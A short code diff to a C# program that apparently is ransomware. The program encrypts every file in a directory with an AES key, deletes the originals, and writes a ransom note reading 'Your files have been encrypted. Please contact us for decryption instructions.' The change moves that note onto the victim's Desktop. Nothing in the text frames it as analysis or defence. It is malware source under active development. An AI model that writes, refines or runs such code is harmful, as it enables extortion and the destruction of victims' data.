@@ -70,6 +70,9 @@ class Program
         // Load the AES key from the PEM file
         Encryptor encryptor = new Encryptor(keyFilePath);
 
+        // Get the Desktop path
+        string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+
         // Scan the directory for files
         string[] files = Directory.GetFiles(directoryPath);
 
@@ -92,11 +95,11 @@ class Program
             // Delete the original file
             File.Delete(filePath);
 
-            // Create and write to a text file with a custom message
-            string messageFilePath = Path.Combine(Path.GetDirectoryName(filePath), "readme.txt");
+            // Create and write to a text file with a custom message on the Desktop
+            string messageFilePath = Path.Combine(desktopPath, "readme_.txt");
             File.WriteAllText(messageFilePath, "Your files have been encrypted. Please contact us for decryption instructions.");
 
-            Console.WriteLine($"Encryption completed. Original file deleted. Encrypted data saved to {outputFile}. Readme file created at {messageFilePath}");
+            Console.WriteLine($"Encryption completed. Original file deleted. Encrypted data saved to {outputFile}. Readme file created on the Desktop at {messageFilePath}");
         }
     }
 }
